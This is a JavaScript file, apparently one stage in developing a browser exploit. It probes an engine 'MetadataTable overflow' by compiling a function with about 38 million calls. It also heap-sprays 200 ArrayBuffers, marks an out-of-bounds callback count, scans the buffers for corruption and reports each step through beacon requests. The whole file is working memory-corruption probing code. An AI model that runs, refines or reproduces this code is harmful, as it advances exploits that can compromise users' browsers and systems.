// p150e — MetadataTable overflow: diagnostic probe
//
// p150d showed: COMPILED-OK → SPRAY-200 → CALL-START → CRASH (no M-1)
// The function crashes before the first callback invocation.
//
// This probe tests WHY:
// 1. Does the function exist and is callable? (try calling with 0 args)
// 2. Does a SMALL function with same callback work?
// 3. Does calling the 38M function with no callback crash?
// 4. Does calling with callback but fewer iterations work?
//
// Beacon prefix: V150E-

(function() {
  function BS(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V150E-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  BS('BOOT');

  // ---- TEST A: Small function with same pattern ----
  // 100 a() calls — should work fine, metadata fits easily
  try {
    BS('A-START');
    var smallSrc = 'window.__smallFn=function(a){' + 'a();'.repeat(100) + '};window.__smallOk=1;';
    var smallBlob = new Blob([smallSrc], {type: 'application/javascript'});
    var smallUrl = URL.createObjectURL(smallBlob);
    var sc1 = document.createElement('script');
    sc1.onload = function() {
      BS('A-COMPILED-' + (window.__smallOk ? 'OK' : 'FAIL'));

      var aCount = 0;
      try {
        window.__smallFn(function() {
          aCount++;
        });
        BS('A-CALLS-' + aCount);
      } catch (e) {
        BS('A-ERR-' + e.message.substring(0, 30));
      }

      testB();
    };
    sc1.onerror = function() { BS('A-SCRIPT-ERR'); testB(); };
    document.head.appendChild(sc1);
    sc1.src = smallUrl;
  } catch (e) {
    BS('A-OUTER-ERR');
    testB();
  }

  // ---- TEST B: Medium function — 10000 calls ----
  function testB() {
    try {
      BS('B-START');
      var medSrc = 'window.__medFn=function(a){' + 'a();'.repeat(10000) + '};window.__medOk=1;';
      var medBlob = new Blob([medSrc], {type: 'application/javascript'});
      var medUrl = URL.createObjectURL(medBlob);
      var sc2 = document.createElement('script');
      sc2.onload = function() {
        BS('B-COMPILED-' + (window.__medOk ? 'OK' : 'FAIL'));

        var bCount = 0;
        try {
          window.__medFn(function() {
            bCount++;
            if (bCount === 1) BS('B-M1');
            if (bCount === 100) BS('B-M100');
            if (bCount === 1000) BS('B-M1000');
            if (bCount === 5000) BS('B-M5000');
            if (bCount === 10000) BS('B-M10000');
          });
          BS('B-TOTAL-' + bCount);
        } catch (e) {
          BS('B-ERR-' + e.message.substring(0, 30));
        }

        testC();
      };
      sc2.onerror = function() { BS('B-SCRIPT-ERR'); testC(); };
      document.head.appendChild(sc2);
      sc2.src = medUrl;
    } catch (e) {
      BS('B-OUTER-ERR');
      testC();
    }
  }

  // ---- TEST C: The actual 38M function — does it exist? ----
  function testC() {
    BS('C-START');

    var N = 38348816;
    BS('C-BUILD-N' + N);

    var CHUNK = 4000000;
    var chunksN = Math.floor(N / CHUNK);
    var rem = N - chunksN * CHUNK;

    var callChunk = 'a();'.repeat(CHUNK);
    var parts = new Array(chunksN + 3);
    parts[0] = 'window.__bigFn=function(a){';
    for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
    parts[chunksN + 1] = 'a();'.repeat(rem);
    parts[chunksN + 2] = '};window.__bigOk=1;';
    callChunk = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    var blobMB = Math.round(blob.size / 1048576);
    BS('C-BLOB-' + blobMB + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc3 = document.createElement('script');
    sc3.onerror = function() { BS('C-SCRIPT-ERR'); };
    sc3.onload = function() {
      var ok = window.__bigOk ? 'OK' : 'FAIL';
      BS('C-COMPILED-' + ok);
      if (ok !== 'OK') return;

      // Spray zeroed ABs
      var sprays = [];
      for (var i = 0; i < 200; i++) {
        sprays.push(new ArrayBuffer(100096));
      }
      BS('C-SPRAYED-200');

      // TEST C1: typeof check
      BS('C-TYPEOF-' + typeof window.__bigFn);

      // TEST C2: Call with no args (undefined callback)
      // This should crash differently — a() tries to call undefined
      // BS('C-NOARG-START');
      // Skip — calling with no args would invoke a() where a=undefined → TypeError

      // TEST C3: Call with a simple counter callback — the REAL test
      BS('C-CALL-START');

      var cCount = 0;
      try {
        window.__bigFn(function() {
          cCount++;
          // Very sparse sync beacons to minimize overhead
          if (cCount === 1) BS('C-M1');
          if (cCount === 10) BS('C-M10');
          if (cCount === 100) BS('C-M100');
          if (cCount === 500) BS('C-M500');
          if (cCount === 890) BS('C-M890');
          if (cCount === 891) BS('C-M891');
          if (cCount === 892) BS('C-M892');
          if (cCount === 893) BS('C-M893');
          if (cCount === 894) BS('C-M894-OOB');
          if (cCount === 895) BS('C-M895');
          if (cCount === 900) BS('C-M900');
          if (cCount === 950) {
            BS('C-BAIL-950');
            throw new Error('bail');
          }
        });
        BS('C-ALL-DONE-' + cCount);
      } catch (e) {
        BS('C-THREW-' + cCount);
      }

      BS('C-TOTAL-' + cCount);

      // Scan sprays
      var hitBufs = 0;
      var totalNZ = 0;
      for (var i = 0; i < sprays.length; i++) {
        var view = new Uint8Array(sprays[i]);
        var nz = 0;
        for (var j = 0; j < view.length; j++) {
          if (view[j] !== 0) nz++;
        }
        if (nz > 0) {
          hitBufs++;
          totalNZ += nz;
          if (hitBufs <= 3) BS('C-HIT-' + i + '-nz' + nz);
        }
      }
      BS('C-SCAN-bufs' + hitBufs + '-nz' + totalNZ);
    };
    document.head.appendChild(sc3);
    sc3.src = url;
  }
})();
